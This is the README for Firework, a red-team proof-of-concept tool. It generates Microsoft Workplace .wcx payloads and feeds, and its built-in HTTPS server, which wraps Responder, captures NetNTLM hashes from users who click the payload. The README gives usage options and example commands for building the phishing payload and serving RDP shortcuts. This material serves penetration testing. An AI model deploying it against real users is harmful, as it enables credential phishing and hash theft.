# Firework

![alt text](https://img.shields.io/badge/Python-2.7_only-blue.svg "Python 2.7 only")

Firework is a proof of concept tool to interact with Microsoft Workplaces creating valid files required for the provisioning process. The tool also wraps some code from Responder to leverage its ability to capture NetNTLM hashes from a system that provisions a Workplace feed via it.

This tool may be used as part of a penetration test or red team exercise to create a .wcx payload (and associated feed) that if clicked on could be used to:

* Phish for credentials - NetNTLM hashes will be sent if a user enters their credentials (or on older versions of Windows automatically).
* Add items to the Start-Menu - After set-up shortcuts are added to the Start-Menu which launch the served RDP file(s). These entries could potentially be used as part of a wider social engineering campaign.
* Download resources - Resources such as the .rdp files and icon files are downloaded and updated by Windows on a daily basis (if authentication of the feed is disabled or is satisfied).

Read the SpiderLabs blog for a more detailed summary and walk through.

## Installation

* Tested with Python 2.7.x. (Python3 not currently supported, although the main Firework class could be used in Python 3)

```bash
$ pip install -r requirements.txt
```
* The tool serves content over HTTPS and requires a certificate and private key to use in-built web server with NetNTLM capture. Default files: ***cert.crt*** and ***key.pem***

## Usage

```

.-:::::'::::::::::..  .,::::::.::    .   .:::  ...    :::::::..    :::  .   
;;;'''' ;;;;;;;``;;;; ;;;;''''';;,  ;;  ;;;'.;;;;;;;. ;;;;``;;;;   ;;; .;;,.
[[[,,== [[[ [[[,/[[['  [[cccc  '[[, [[, [[',[[     \[[,[[[,/[[['   [[[[[/'  
`$$$"`` $$$ $$$$$$c    $$""""    Y$c$$$c$P $$$,     $$$$$$$$$c    _$$$$,    
 888    888 888b "88bo,888oo,__   "88"888  "888,_ _,88P888b "88bo,"888"88o, 
 "MM,   MMM MMMM   "W" """"YUMMM   "M "M"    "YMMMMMP" MMMM   "W"  MMM "MMP"


usage: firework.py [-h] -c COMPANY -u URL -a APP -e EXT -i ICON [-l LISTEN]
                   [-r RDP] [-d DOMAIN] [-n USERNAME] [-p PASSWORDHASH]
                   [-t CERT] [-k KEY]

WCX workplace tool

optional arguments:
  -h, --help            show this help message and exit
  -c COMPANY, --company COMPANY
                        Company name
  -u URL, --url URL     Feed URL
  -a APP, --app APP     App Name
  -e EXT, --ext EXT     App Extension
  -i ICON, --icon ICON  App Icon
  -l LISTEN, --listen LISTEN
                        TLS Web Server Port
  -r RDP, --rdp RDP     RDP Server
  -d DOMAIN, --domain DOMAIN
                        RDP Domain
  -n USERNAME, --username USERNAME
                        RDP Username
  -p PASSWORD, --password PASSWORD
                        RDP Password
  -t CERT, --cert CERT  SSL cert
  -k KEY, --key KEY     SSL key

```

## Examples

Basic example:

* Organisation Name: EvilCorp
* URL to feed XML (or URL to Firework's in-built server): https://example.org/ - This is where Windows downloads the feed from.
* Application Name: Firework
* File Extension: .fwk
* Icon File: firework.ico

```bash
python ./firework.py -c EvilCorp -u https://example.org/ -a Firework -e .fwk -i ./firework.ico 
```

In built web server will start on port 443 if **cert.crt** and **key.pem** are present in current directory. This will force an NTLM challenge with responder. If these files are not present the tool will write all files to local directory for your own hosting.

If you wish to start the in-built  web server on alternate port use the -l flag as below:

```bash
python ./firework.py -c EvilCorp -u https://example.org/ -a Firework -e .fwk -i ./firework.ico -l 8443
```

You can also add some customisations to the .rdp file that gets served.

* Remote Desktop Server: dc.corp.local
* Domain: corp.local
* Username: admin
* Password Crypt: Encrypted password that gets included in RDP file

Note: Passwords stored in .rdp files are likely ignored in a default config.

```bash
python ./firework.py -c EvilCorp -u https://example.org/ -a Firework -e .fwk -i ./firework.ico -r dc.corp.local -d corp.local -n admin -p <crypt password>
```

## Payload

Having run the tool 'payload.wcx' will be written to current directory. This file is what when clicked on starts the provisioning process.

## Authors
* **David Middlehurst** - Twitter- [@dtmsecurity](https://twitter.com/dtmsecurity)

## License

Firework

Created by David Middlehurst
Copyright (C) 2018 Trustwave Holdings, Inc.
 
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

## Acknowledgments

* [Responder by Laurent Gaffie](https://github.com/SpiderLabs/Responder)
* [Firework Icon](https://icons8.com/icon/39296/firework-filled)
